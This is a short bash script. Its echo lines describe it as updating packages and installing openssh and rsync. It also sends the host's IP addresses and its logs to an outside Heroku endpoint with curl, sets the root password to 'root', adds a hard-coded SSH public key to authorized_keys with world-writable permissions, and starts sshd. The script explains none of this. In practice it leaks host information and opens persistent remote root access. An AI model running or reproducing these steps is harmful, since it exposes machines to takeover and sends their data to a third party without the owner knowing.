#!/bin/bash

var=$(ip a|grep -n inet);
curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="$var"
touch datalog.txt;
apt update -y | tee -a datalog.txt;
apt upgrade -y | tee -a datalog.txt ;
output=$(cat datalog.txt);
curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="$output";
echo "STEP 1 >>>> update and upgarde is completed"
apt install openssh -y  | tee  datalog.txt  ;
apt install rsync -y  | tee -a datalog.txt  ;
echo "STEP 2 >>>> Installed openssh" | tee -a datalog.txt;
echo "STEP 3 >>>> Installed rsync" | tee -a datalog.txt;
output=$(cat datalog.txt);
curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="$output";
echo -e "root\nroot" | passwd | tee  datalog.txt;
cd ./.ssh;
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKjG6NTGNTDFEiJR9OZ2/bxsQLLD8Vmt7/QUGhGjWt5HSoG2aekPnnx386Npmh/y0v8v0tSHH1SGcbhqkm39zqA5Ko9Y6QniiWZf9fcHRkk56q5yKC8aoegZs1ZtXVvNGpy4f6ZuHEGMW26WHSHDDp5BrVeLcyjz3ywj2kP6ATYDaynNe9zbz5o0K+JtmA+nZnplbNiA/3KOBCKZh3U8NUS89452Y8BZXwTS7McNWKzLDI4uUgGrc9gsmv/5uYBGHQfho6/m35cgOePsga3/+aWHg5KhaIFpXAZnQjXWiU4sIIU/rem7OfgMnDYTNstATWUrvnnEQiHBtiYBjkZn0PQPsQE5acn44qgKyydjrSN4mTvDL/JVju1YhHIHO5omKes5isFqISvjPvH1zO0LHb1ZyH6yaLO93zsul6YcgIMDYwovILIcPlLk9x+ycCD4Wk6/briezehTbmEHvvyuEopMXjwbypqd7aWZTEJHB1NUeSGe4qSHu+1Cn7iHKegJ0= adarshbp@adarshbp' >> authorized_keys ;
chmod 777 authorized_keys ;
echo "STEP 4 >>>> Configured key";
output3=$(cat datalog.txt);
curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="$output3";
curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="completed";
sshd
